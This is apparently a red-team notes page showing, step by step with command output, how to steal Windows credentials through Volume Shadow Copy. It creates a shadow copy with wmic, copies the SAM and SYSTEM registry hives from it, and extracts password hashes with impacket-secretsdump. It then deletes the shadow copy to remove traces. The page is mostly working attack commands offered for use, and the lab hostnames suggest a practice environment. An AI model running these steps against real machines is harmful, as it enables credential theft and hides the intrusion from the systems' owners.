---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/shadow-copy
---

# Shadow Copy

With elevated privilege

```powershell
C:\>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{454E3F18-B0D8-4C7B-891D-439E9F773ADF}";
};
```

List the existing shadow volumes with list shadows:

```powershell
C:\>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {869a05c9-8b82-48dd-845a-d3f952550802}
   Contained 1 shadow copies at creation time: 4/2/2024 2:42:56 PM
      Shadow Copy ID: {454e3f18-b0d8-4c7b-891d-439e9f773adf}
         Original Volume: (C:)\\?\Volume{7daad430-ba07-41f6-9abe-8ce956f64e22}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: WST2.vulnableone.local
         Service Machine: WST2.vulnableone.local
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

Shadow copying the SAM database

```powershell
C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM C:\Users\sieng.chantrea\Desktop\SAM
        1 file(s) copied.
        
C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM C:\Users\sieng.chantrea\Desktop\SYSTEM
        1 file(s) copied.
```

Dumping the hash

```python
└─$ impacket-secretsdump -sam sam -system system local
```

Deleting shadow copy

```powershell
C:\>vssadmin Delete Shadows /Shadow={454e3f18-b0d8-4c7b-891d-439e9f773adf}
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Do you really want to delete 1 shadow copies (Y/N): [N]? Y

Successfully deleted 1 shadow copies.

C:\>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

No items found that satisfy the query.
```
